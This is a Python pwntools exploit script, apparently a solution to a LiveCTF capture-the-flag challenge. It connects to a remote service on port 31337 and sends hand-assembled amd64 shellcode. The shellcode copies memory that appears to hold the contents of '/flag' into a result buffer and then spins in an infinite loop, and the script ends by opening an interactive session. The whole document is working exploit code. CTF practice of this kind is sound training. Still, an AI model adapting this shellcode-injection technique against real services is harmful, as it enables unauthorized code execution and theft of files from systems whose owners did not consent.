from pwn import *

context.arch = 'amd64'

def run(fname=None,data=None):
    r.sendlineafter('Choice: ','1')
    if fname is not None:
        r.sendlineafter(b'> ',fname)
    else:
        r.sendlineafter(b'> ','/dev/stdin')
        sleep(1)
        r.send(data)

def checkres():
    r.sendlineafter('Choice: ','2')

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

r = remote(HOST, int(PORT))
#r = process('./handout/challenge')
#r = process('./challenge')

sc = b'\xc3'*0x80+asm(f'''
    mov rax, [rsp+0x30]
    add rax, 0xc
    mov rcx, 0x80
    mov rdi, {u64(b"LiveCTF{")}
    mov [rax], rdi
    add rax, 8
    LOOP:
      mov rdi, [rdx+0x8]
      mov [rax], rdi
      add rax, 0x8
      add rdx, 0x8
      sub rcx, 8
      cmp rcx, 0
      jne LOOP
    INF:
      jmp INF
    ''')

run(data=sc)
run(fname='/flag')
run(fname='/flag')
sc = asm(f'''
    mov rax, [rsp+0x30]
    add rax, 0xc
    mov rcx, 0x80
    mov rdi, {u64(b"LiveCTF{")}
    mov [rax], rdi
    add rax, 8
    sub rdx, 0x2000
    LOOP:
      mov rdi, [rdx+0x8]
      mov [rax], rdi
      add rax, 0x8
      add rdx, 0x8
      sub rcx, 8
      cmp rcx, 0
      jne LOOP
    INF:
      jmp INF
    ''')

run(data=sc)
checkres()
r.interactive()
